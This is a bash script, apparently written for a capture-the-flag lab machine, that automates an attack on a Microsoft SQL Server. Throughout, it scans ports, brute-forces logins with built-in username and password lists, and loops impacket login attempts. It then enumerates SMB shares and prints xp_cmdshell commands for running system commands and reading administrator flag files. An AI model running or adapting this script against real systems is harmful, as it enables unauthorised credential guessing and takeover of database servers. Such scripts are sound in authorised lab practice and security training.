#!/bin/bash
# SYSTEM 2: SIGNED - COMPLETE RECONNAISSANCE & EXPLOITATION
# Update IP, then run

S2_IP="10.10.11.90"
OUTPUT_DIR="$HOME/Downloads/system2_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 2: SIGNED - COMPLETE TEST"
echo "=========================================="

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================
echo "[*] Phase 1: Reconnaissance"

# Connectivity
ping -c 4 $S2_IP > 01_ping.txt 2>&1

# Port scans
nmap -sC -sV -oN 02_initial_scan.txt $S2_IP
nmap -p- --min-rate 2000 -oN 03_full_scan.txt $S2_IP

# MSSQL detailed information
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info -oN 04_mssql_info.txt $S2_IP

# ============================================
# PHASE 2: VULNERABILITY ANALYSIS
# ============================================
echo "[*] Phase 2: Vulnerability Analysis"

# MSSQL empty password check
nmap -p 1433 --script ms-sql-empty-password -oN 05_mssql_empty.txt $S2_IP

# Create wordlists
echo "sa
admin
administrator
sql
sqladmin
mssql
dbadmin
backup
svc_mssql
MSSQLSvc
SQLSvc" > users_mssql.txt

echo "password
Password123
P@ssw0rd
admin
Admin123
Welcome123
Summer2024
Winter2024
Spring2024
Fall2024" > pass_mssql.txt

# MSSQL brute force
nmap -p 1433 --script ms-sql-brute --script-args userdb=users_mssql.txt,passdb=pass_mssql.txt,ms-sql-brute.timeout=5 -oN 06_mssql_brute.txt $S2_IP

# MSSQL version vulnerabilities
searchsploit mssql > 07_mssql_exploits.txt 2>&1

# ============================================
# PHASE 3: EXPLOITATION ATTEMPTS
# ============================================
echo "[*] Phase 3: Exploitation"

# Try to connect with common credentials
echo "Attempting MSSQL connections..."
for user in sa admin administrator; do
    for pass in password Password123 P@ssw0rd admin; do
        impacket-mssqlclient $user:$pass@$S2_IP -windows-auth 2>&1 | head -20 > 08_mssql_${user}_${pass}.txt
    done
done

# If credentials found, try xp_cmdshell
echo "If credentials found, run:"
echo "  impacket-mssqlclient USER:PASS@$S2_IP"
echo "  SQL> EXEC xp_cmdshell 'whoami';"
echo "  SQL> EXEC xp_cmdshell 'hostname';"
echo "  SQL> EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\root.txt';"

# ============================================
# PHASE 4: SMB ENUMERATION (if port 445 opens)
# ============================================
echo "[*] Phase 4: SMB Enumeration"

# Check if SMB is open
if nmap -p 445 $S2_IP | grep -q "open"; then
    enum4linux -a $S2_IP > 09_enum4linux.txt 2>&1
    smbclient -L //$S2_IP/ -N > 10_smbclient.txt 2>&1
    smbmap -H $S2_IP > 11_smbmap.txt 2>&1
fi

# ============================================
# PHASE 5: POST-EXPLOITATION (if access gained)
# ============================================
echo "[*] Phase 5: Post-Exploitation (run if access gained)"
echo "If you gain access via MSSQL xp_cmdshell:"
echo "  - whoami"
echo "  - hostname"
echo "  - systeminfo"
echo "  - type C:\\Users\\Administrator\\Desktop\\root.txt"
echo "  - type C:\\Users\\Public\\user.txt"

echo ""
echo "=========================================="
echo "SYSTEM 2: SIGNED - COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR"

